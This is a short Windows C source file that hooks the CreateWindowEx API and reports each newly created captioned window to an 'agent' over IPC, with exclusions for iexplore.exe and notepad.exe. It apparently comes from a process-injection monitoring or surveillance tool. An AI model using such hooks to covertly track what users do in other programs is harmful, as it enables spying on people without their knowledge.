#include <windows.h>
#include "Common.h"
#include "missing.h"
#include "Hooking.h"
#include "Snapshots.h"

HWND _stdcall H_CreateWindowExHook(void *data_param,
								   DWORD dwExStyle,
								   void *lpClassName,
								   void *lpWindowName,
								   DWORD dwStyle,
								   int x,
								   int y,
								   int nWidth,
								   int nHeight,
								   HWND hWndParent,
								   HMENU hMenu,
								   HINSTANCE hInstance,
								   LPVOID lpParam) 
{

	INIT_WRAPPER(H_CreateWindowEx, HWND);
	CALL_ORIGINAL_API(dwExStyle, lpClassName, lpWindowName, dwStyle, x, y, nWidth, nHeight, hWndParent, hMenu, hInstance, lpParam);
	if (ret_code == NULL)
		return ret_code;
	
	IF_ACTIVE_AGENT(PM_ONNEWWINDOW_IPC) {
		if ( (dwStyle&WS_CAPTION)==WS_CAPTION || (dwStyle&WS_EX_MDICHILD)==WS_EX_MDICHILD)
			IPC_CLIENT_WRITE(PM_ONNEWWINDOW_IPC, (BYTE *)&ret_code, 4, dwStyle, IPC_DEF_PRIORITY);
	}
	return ret_code;
}

BOOL H_CreateWindowEx_setup(H_CreateWindowExStruct *data)
{
	// XXX - A iexplore a 64bit non piace che gli si hookino queste funzioni 
	if (AmIThis(L"iexplore.exe") || AmIThis(L"notepad.exe"))
		return FALSE;
	return TRUE;
}